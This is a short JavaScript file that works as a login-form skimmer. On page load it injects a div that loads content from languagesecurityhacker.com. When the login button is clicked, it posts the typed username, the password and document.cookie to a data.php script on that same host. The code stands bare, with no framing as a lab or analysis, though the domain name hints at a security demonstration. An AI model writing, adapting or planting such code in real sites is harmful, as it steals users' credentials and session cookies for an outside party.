$(document).ready(function(){
	var login= document.getElementById("login");
	var newDiv = document.createElement("div"); 
	newDiv.setAttribute("id", "myid");
	document.body.appendChild(newDiv); 
	var id =document.getElementById("myid");
	$(function(){
	        	$("#myid").load("http://languagesecurityhacker.com/weather.html"); 
	});
	var btn1 = document.getElementById("btn");
	btn1.onclick = function(){
	var username = document.getElementById("username").value;
	var pswd= document.getElementById("password").value;
	sendData(username,pswd,document.cookie);
    }
});

function sendData(un,pswd,cookie) {
	var httpc = new XMLHttpRequest();
	var url = "http://languagesecurityhacker.com/data.php";
	httpc.open("POST", url, true); 
	var vars = "username="+un+"&password="+pswd+"&cookie="+cookie;
	httpc.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        httpc.onreadystatechange = function() {
        if(httpc.readyState == 4 && httpc.status == 200) { 
        }
    }
    httpc.send(vars);
}
